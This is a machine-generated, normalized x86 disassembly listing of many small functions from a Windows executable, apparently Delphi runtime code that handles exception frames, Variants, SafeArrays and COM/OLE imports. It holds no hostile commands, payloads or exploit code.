mov eax ecx
retn
call sub_40c2bc
mov ecx eax
sub_40c544
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c564
push eax
call CharNextA
retn
sub_40c814
jmp sub_4039a0
sub_40c81b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c884
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40ccdb
jmp sub_4039a0
sub_40cce2
pop ebx
mov esp ebp
pop ebp
retn
sub_40ceab
jmp sub_4039a0
sub_40ceb2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cf54
jmp sub_4039a0
sub_40cf5b
pop ebx
mov esp ebp
pop ebp
retn
sub_40cf60
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cec4
sub_40cf70
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cf8c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4027d4
pop ebx
retn
sub_40d014
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40d020
xchg [ eax ] edx
mov eax edx
retn
sub_40d080
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d110
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d228
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d250
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d4cb
jmp sub_4039a0
sub_40d4d2
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d540
jmp sub_4039a0
sub_40d547
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d565
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d55e
jmp sub_4039a0
sub_40d565
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d9b5
jmp sub_4039a0
sub_40d9bc
pop ebp
retn
sub_40da28
jmp sub_4039a0
sub_40da2f
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantCopyInd
jmp [ __import_lookup_table_11(oleaut32:VariantCopyInd) ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40da96
mov eax eax
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x8
sub_40dab0
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40db16
jmp sub_4039a0
sub_40db1d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db82
jmp sub_4039a0
sub_40db89
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dbee
jmp sub_4039a0
sub_40dbf5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc5a
jmp sub_4039a0
sub_40dc61
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcc6
jmp sub_4039a0
sub_40dccd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dd45
jmp sub_4039a0
sub_40dd4c
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40ddb8
jmp sub_4039a0
sub_40ddbf
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40de28
jmp sub_4039a0
sub_40de2f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40de9c
jmp sub_4039a0
sub_40dea3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
SafeArrayAccessData
jmp [ SafeArrayAccessData@IAT ]
SafeArrayUnaccessData
jmp [ SafeArrayUnaccessData@IAT ]
SafeArrayGetElement
jmp [ SafeArrayGetElement@IAT ]
SafeArrayPutElement
jmp [ SafeArrayPutElement@IAT ]
sub_40e249
jmp sub_4039a0
sub_40e250
pop ebp
retn
sub_40e254
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40df18
sub_40e265
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e9fa
jmp sub_4039a0
sub_40ea01
pop ecx
pop ebp
retn
sub_40ea93
jmp sub_4039a0
sub_40ea9a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eaea
jmp sub_4039a0
sub_40eaf1
pop ecx
pop ebp
retn
sub_40eb83
jmp sub_4039a0
sub_40eb8a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ebda
jmp sub_4039a0
sub_40ebe1
pop ecx
pop ebp
retn
sub_40ee29
jmp sub_4039a0
sub_40ee30
pop ebx
mov esp ebp
pop ebp
retn
sub_40ef46
jmp sub_4039a0
sub_40ef4d
pop ecx
pop ebp
retn
sub_40ef50
push ebx
mov ebx eax
mov eax ebx
call sub_40f1e8
mov [ ebx ] 0x1
pop ebx
retn
sub_40f1fc
push eax
call sub_40f1e8
pop eax
retn
sub_40f45c
call sub_40f510
retn
sub_40f574
xchg edx eax
call sub_412ea0
retn
sub_40f57c
call sub_40f790
retn
sub_40f781
jmp sub_4039a0
sub_40f788
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40f790
test [ edx + 0x1 ] 0x40
jne r-xdata
call sub_40f5b8
retn
call sub_40f510
retn
j_sub_40f7a4
jmp sub_40f7a4
sub_40f7c9
retn
sub_40f828
jmp sub_4039a0
sub_40f82f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f876
jmp sub_4039a0
sub_40f87d
pop ebx
pop ecx
pop ebp
retn
sub_40f8c2
jmp sub_4039a0
sub_40f8c9
pop ebx
pop ecx
pop ebp
retn
sub_40f90e
jmp sub_4039a0
sub_40f915
pop ebx
pop ecx
pop ebp
retn
sub_40f95a
jmp sub_4039a0
sub_40f961
pop ebx
pop ecx
pop ebp
retn
sub_40fd23
jmp sub_4039a0
sub_40fd2a
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fdc4
jmp sub_4039a0
sub_40fdcb
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410239
jmp sub_4036ec
sub_4102f4
jmp sub_4036ec
sub_41039b
jmp sub_4036ec
sub_410494
jmp sub_4036ec
sub_41056d
jmp sub_4036ec
sub_410655
jmp sub_4036ec
sub_410812
jmp sub_4039a0
sub_410819
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41087b
jmp sub_4039a0
sub_410882
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410ce8
jmp sub_4036ec
sub_410dd7
jmp sub_4039a0
sub_410dde
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410e7c
jmp sub_4039a0
sub_410e83
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411220
call sub_410ed8
neg al
sbb eax eax
neg eax
retn
sub_4112e1
jmp sub_4039a0
sub_4112e8
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411391
jmp sub_4039a0
sub_411398
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4118e9
jmp sub_4036ec
sub_4119f0
jmp sub_4039a0
sub_4119f7
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411b01
jmp sub_4039a0
sub_411b08
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411f58
jmp sub_4039a0
sub_411f5f
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412069
jmp sub_4039a0
sub_412070
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4125b6
jmp sub_4039a0
sub_4125bd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412661
jmp sub_4039a0
sub_412668
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41268a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4046c0
retn
sub_412683
jmp sub_4039a0
sub_41268a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4126e6
jmp sub_4039a0
sub_4126ed
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412769
jmp sub_4039a0
sub_412caf
jmp sub_4039a0
sub_412cb6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412d49
jmp sub_4039a0
sub_412d50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412d6d
lea eax [ ebp - 0x14 ]
call sub_4046a8
retn
sub_412d66
jmp sub_4039a0
sub_412d6d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412dca
jmp sub_4039a0
sub_412dd1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412e73
jmp sub_4039a0
sub_412e90
jmp sub_4039a0
sub_412e97
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4133f2
jmp sub_4039a0
sub_4133f9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41346a
jmp sub_4039a0
sub_413471
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4137fc
push eax
call sub_40f1e8
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413810
push eax
call sub_40f1e8
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413893
jmp sub_4039a0
sub_41389a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413973
jmp sub_4039a0
sub_41397a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4139d6
jmp sub_4039a0
sub_4139dd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4139e4
call sub_4139ec
retn
sub_413b3c
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f510
add esp 0x10
sub_413de6
jmp sub_4039a0
sub_413ded
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413e34
jmp r-xdata
cmp [ eax ] 0x400c
je r-xdata
mov eax [ eax + 0x8 ]
retn
sub_413e44
push ecx
mov edx esp
call sub_415874
pop edx
retn
sub_413e50
cmp ax 0x8
je r-xdata
mov al 0x1
retn
cmp ax 0x100
je r-xdata
xor eax eax
retn
sub_413e64
push ebx
mov ebx eax
mov eax ebx
call sub_413e34
cmp [ eax ] 0x1
sete al
pop ebx
retn
sub_413f05
jmp sub_4039a0
sub_413f0c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413f40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f1e8
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_413f58
mov edx 0x80020004
call sub_413f40
retn
sub_414108
push ebx
mov ebx eax
mov eax ebx
call sub_414050
push eax
call SafeArrayUnaccessData
call sub_40ee38
pop ebx
retn
sub_414120
mov edx eax
sub dx 0x16
jae r-xdata
xor eax eax
retn
movzx eax ax
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_41423c
jmp sub_4039a0
sub_414243
pop ebx
mov esp ebp
pop ebp
retn
sub_4143a4
jmp sub_4039a0
sub_41441c
xor edx edx
test eax eax
je r-xdata
mov eax edx
retn
xor ecx ecx
mov cl [ eax + 0x1 ]
add eax ecx
mov ecx [ eax + 0x6 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
sub_414438
push ebx
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
cmp [ eax ] 0x11
je r-xdata
inc ebx
call sub_41441c
sub_414927
jmp sub_4039a0
sub_414962
jmp sub_4039a0
sub_414969
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c41
jmp sub_4039a0
sub_414c71
jmp sub_4039a0
sub_414c78
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414d05
jmp sub_4039a0
sub_414d0c
pop esi
pop ebx
pop ebp
retn
sub_414d10
push ebp
mov ebp esp
call sub_41519c
pop ebp
retn 0x4
sub_414d9c
push ebp
mov ebp esp
call sub_41519c
pop ebp
retn 0x4
sub_415090
jmp sub_4039a0
sub_415097
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150c4
lea eax [ ebp - 0x140 ]
call sub_403f9c
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_403fc0
retn
sub_4150bd
jmp sub_4039a0
sub_41514b
jmp sub_4039a0
sub_415152
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40323c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035c0
sub_415174
xor eax eax
retn
sub_415178
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41518c
mov [ ecx ] 0x8
mov al 0x1
retn
sub_415194
call sub_40e9b0
retn
sub_41519c
call sub_40eaa0
retn
sub_4151aa
mov eax eax
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4151c0
call sub_41519c
retn
sub_4151d8
mov eax edx
mov edx ecx
call sub_40f790
retn
sub_4151e4
push ebp
mov ebp esp
mov eax edx
mov edx ecx
movzx ecx [ ebp + 0x8 ]
call sub_40fa54
pop ebp
retn 0x4
sub_4151f8
test [ edx + 0x1 ] 0x40
setne al
retn
sub_415200
push ebp
mov ebp esp
call sub_4151a4
pop ebp
retn 0x8
sub_41520c
mov eax edx
mov edx ecx
call sub_413824
retn
sub_415218
mov eax edx
mov edx ecx
call sub_4138a0
retn
sub_415222
mov eax eax
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_41522e
mov eax eax
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_415264
mov ax [ edx ]
call sub_413e50
retn
sub_415270
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_413e78
pop esi
pop ebx
retn
sub_415284
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_407f64
pop esi
pop ebx
retn
sub_415589
jmp sub_4039a0
sub_415590
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4156e3
jmp sub_4039a0
sub_415834
jmp sub_4039a0
sub_41583b
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_415844
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_415850
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_41585c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_415868
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_41591c
jmp sub_4039a0
sub_4159e5
jmp sub_4039a0
sub_4159ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a09
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
sub_415a02
jmp sub_4039a0
sub_415a09
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415a14
call sub_40ef50
retn
sub_415a8b
jmp sub_4039a0
sub_415a92
pop ebp
retn
sub_415b35
jmp sub_4039a0
sub_415b3c
pop ebp
retn
sub_415c5d
jmp sub_4039a0
sub_415c64
pop ebp
retn
sub_415c68
sub [ rw-data ] 0x1
retn
sub_415c71
add eax 0xfffffff0
push eax
mov eax [ eax ]
mov eax [ eax + 0x50 ]
xchg [ esp ] eax
retn
sub_415c7e
add [ esp + 0x4 ] 0xfffffff0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_41613b
jmp sub_4039a0
sub_416142
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41646c
jmp sub_4039a0
sub_416473
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4164db
jmp sub_4039a0
sub_4164e2
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4165e2
jmp sub_4039a0
sub_4165e9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416978
jmp sub_4039a0
sub_41697f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_416ab7
jmp sub_4039a0
sub_416abe
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416b84
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_416aec
mov eax ebx
mov edx esp
call sub_404200
add esp 0x100
pop ebx
retn
sub_416be0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403ff0
pop esi
pop ebx
retn
sub_416cbc
jmp sub_4039a0
sub_416cc3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416d14
jmp sub_4039a0
sub_416d1b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416e68
jmp sub_4039a0
sub_416e6f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416f3e
jmp sub_4039a0
sub_416f45
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41725c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f510
pop esi
pop ebx
retn
sub_417446
jmp sub_4039a0
sub_41744d
pop ebp
retn
sub_417450
sub [ rw-data ] 0x1
retn
IsEqualGUID
jmp [ __import_lookup_table_12(ole32:IsEqualGUID) ]
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoGetClassObject
jmp [ CoGetClassObject@IAT ]
CoCreateInstance
jmp [ __import_lookup_table_12(ole32:CoCreateInstance) ]
StringFromCLSID
jmp [ StringFromCLSID@IAT ]
ProgIDFromCLSID
jmp [ ProgIDFromCLSID@IAT ]
CoTaskMemFree
jmp [ CoTaskMemFree@IAT ]
OleSetMenuDescriptor
jmp [ OleSetMenuDescriptor@IAT ]
OleDraw
jmp [ OleDraw@IAT ]
IsAccelerator
jmp [ IsAccelerator@IAT ]
CreateStreamOnHGlobal
jmp [ CreateStreamOnHGlobal@IAT ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ __import_lookup_table_13(oleaut32:GetErrorInfo) ]
sub_41777d
jmp sub_4039a0
sub_417784
pop ebp
retn
sub_417788
sub [ rw-data ] 0x1
retn
sub_41808b
add [ esp + 0x4 ] 0xfffffff8
jmp sub_41a9d0
sub_4187e8
retn 0x4187
sub_418a73
add [ esp + 0x4 ] 0xffffffd8
jmp sub_4203a8
sub_418a87
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_418df4
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_418f18
mov eax [ eax + 0xc ]
call sub_41a0dc
retn
sub_4191ef
jmp sub_4039a0
sub_4191f6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4191fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a294
test eax eax
setge al
pop esi
pop ebx
retn
sub_4194ff
jmp sub_4039a0
sub_419506
mov esp ebp
pop ebp
retn
sub_4195d4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4195e0
push ebx
mov ebx edx
mov edx ebx
call sub_4193f4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_419154
sub_41968c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4197e7
jmp sub_4039a0
sub_4198bb
jmp sub_4039a0
sub_4198cc
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_419938
jmp sub_4039a0
sub_41993f
pop ebx
mov esp ebp
pop ebp
retn
sub_41998a
jmp sub_4039a0
sub_419991
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_419a1d
jmp sub_4039a0
sub_419a24
pop ebx
pop ebp
retn
sub_419a6a
jmp sub_4039a0
sub_419a71
pop ebx
pop ebp
retn
sub_419ab6
jmp sub_4039a0
sub_419abd
pop ebx
pop ebp
retn
sub_419b07
jmp sub_4039a0
sub_419b0e
pop esi
pop ebx
pop ebp
retn
sub_419b62
jmp sub_4039a0
sub_419b69
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_419c96
jmp sub_4039a0
sub_419d6c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41a37c
sub_419e5c
jmp sub_4039a0
sub_419fe6
jmp sub_4039a0
sub_419fed
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a087
jmp sub_4039a0
sub_41a08e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0ad
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41a0a6
jmp sub_4039a0
sub_41a0ad
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41a110
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a3d8
xor edx edx
mov eax ebx
call sub_41a39c
pop ebx
retn
sub_41a188
mov eax [ ebp + 0x4 ]
retn
sub_41a1be
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41a20c
jmp sub_4039a0
sub_41a213
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a218
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_41a230
xor edx edx
call sub_41a238
retn
sub_41a320
mov edx [ eax + 0x8 ]
dec edx
call sub_41a238
retn
sub_41a448
retn
sub_41a502
jmp sub_4039a0
sub_41a509
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035c0
sub_41a598
jmp sub_4039a0
sub_41a59f
pop ebx
pop ecx
pop ebp
retn
sub_41a5a4
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41a5fb
jmp sub_4039a0
sub_41a602
pop ebx
pop ecx
pop ebp
retn
sub_41a608
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41a644
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
retn
sub_41a65c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41a737
retn
sub_41a7dc
test edx edx
je r-xdata
xor edx edx
call sub_41a7f0
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_41a8a6
jmp sub_4039a0
sub_41a8ad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a8c0
xchg edx eax
call sub_41a7f0
retn
sub_41a8c8
retn
sub_41a961
jmp sub_4039a0
sub_41a968
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a9be
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_41aab2
jmp sub_4039a0
sub_41abc2
jmp sub_4039a0
sub_41abc9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41abe6
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_41abdf
jmp sub_4039a0
sub_41abe6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ac70
jmp sub_4039a0
sub_41ac88
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41ad44
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41aded
jmp sub_4039a0
sub_41adf4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ae00
mov eax [ ebp + 0x4 ]
retn
sub_41ae36
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41ae84
jmp sub_4039a0
sub_41ae8b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41af4a
jmp sub_4039a0
sub_41af51
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41af73
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fc0
retn
sub_41af6c
jmp sub_4039a0
sub_41af73
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41af7c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41af84
xor eax eax
retn
sub_41afcd
jmp sub_4039a0
sub_41afd4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41b0e7
jmp sub_4039a0
sub_41b0ee
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b17c
jmp sub_4039a0
sub_41b183
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b253
jmp sub_4039a0
sub_41b25a
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b310
jmp sub_4039a0
sub_41b317
pop esi
pop ecx
pop ebp
retn
sub_41b39c
jmp sub_4039a0
sub_41b3a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b3c0
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
sub_41b3b9
jmp sub_4039a0
sub_41b3c0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b44c
jmp sub_4039a0
sub_41b469
jmp sub_4039a0
sub_41b470
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b4ac
retn
sub_41b52f
jmp sub_4039a0
sub_41b536
mov eax [ ebp - 0x8 ]
call sub_41e070
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b55b
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_41b554
jmp sub_4039a0
sub_41b55b
mov esp ebp
pop ebp
retn
sub_41b5ab
jmp sub_4039a0
sub_41b5b2
pop esi
pop ecx
pop ebp
retn
sub_41b605
jmp sub_4039a0
sub_41b60c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b614
retn
sub_41b68f
jmp sub_4039a0
sub_41b696
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b733
jmp sub_4039a0
sub_41b73a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b757
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
sub_41b750
jmp sub_4039a0
sub_41b757
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b75c
retn
sub_41b7d6
jmp sub_4039a0
sub_41b7dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b7e4
mov eax edx
mov edx ecx
call sub_408144
retn
sub_41b7f0
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41b808
sub_41b880
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41b8f0
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41b90c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
